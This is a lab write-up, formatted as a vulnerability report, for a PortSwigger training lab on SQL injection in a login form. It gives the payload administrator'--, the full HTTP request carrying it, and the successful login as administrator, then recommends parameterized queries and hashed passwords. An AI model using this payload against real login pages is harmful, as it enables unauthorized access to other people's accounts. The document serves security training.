
---
# SQL Injection in Login Authentication allows Authentication Bypass

## 1. Executive Summary

A SQL injection vulnerability exists in the application's login functionality, where user-controlled credentials are incorporated into a SQL query without proper parameterization. By injecting SQL syntax into the username parameter, an attacker can alter the authentication query's logic and bypass the application's password verification, resulting in unauthorized access to an account.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — Authentication Bypass
    
- **Target Endpoint/URL:** `/login`
    
- **Affected Parameter(s):** `username`
    
- **Authentication Level Required:** Unauthenticated
    

The application likely constructs an authentication query similar to:

```
SELECT * FROM users
WHERE username = 'administrator'
AND password = 'password';
```

Because the `username` value is directly incorporated into the SQL query, an attacker can inject SQL syntax that changes the query's logical conditions.

## 3. Steps to Reproduce (STR)

1. Access the PortSwigger lab.
    
2. Navigate to the application's login page.
    
3. Enter a username such as `administrator`.
    
4. Enter any arbitrary password.
    
5. Submit the login form and observe that authentication fails.
    
6. Intercept the login request using Burp Suite.
    
7. Modify the `username` parameter to:
    

```
administrator'--
```

8. Leave the password parameter unchanged or enter any arbitrary value.
    
9. Forward the request to the application.
    
10. The resulting SQL query is effectively interpreted as:
    

```
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'anything';
```

11. The `--` sequence causes the remainder of the SQL statement, including the password check, to be treated as a comment.
    
12. The query therefore only needs to match the `administrator` username.
    
13. Observe that the application authenticates the attacker as the administrator account.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

```
POST /login HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator%27--&password=anything
```

The injected username causes the application's query to become conceptually:

```
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = 'anything';
```

The password condition is commented out, so the application authenticates the attacker based solely on the username.

```
HTTP/1.1 302 Found
Location: /my-account
```

The attacker is subsequently logged in as the `administrator` user.

### Evidence (Screenshots/Video)

-

## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can bypass the application's authentication mechanism by manipulating the SQL query executed during login. In this lab, the attacker gains access to the administrator account without knowing the administrator's password.

- **Business Impact:** Authentication bypass can result in unauthorized access to privileged functionality and sensitive information. If the affected account has administrative privileges, successful exploitation could allow an attacker to compromise application data, modify configuration, manage users, or perform other privileged operations.


## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for authentication queries so that user input is always treated as data rather than executable SQL syntax. Passwords should also be securely hashed and verified using an appropriate password-hashing mechanism rather than compared as plaintext SQL values.


Example:

```
cursor.execute(
    "SELECT id, username, password_hash FROM users WHERE username = %s",
    (username,)
)
```

The application should then verify the supplied password against the stored password hash in application code.

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - CWE-287: Improper Authentication
        
    - PortSwigger Web Security Academy — SQL Injection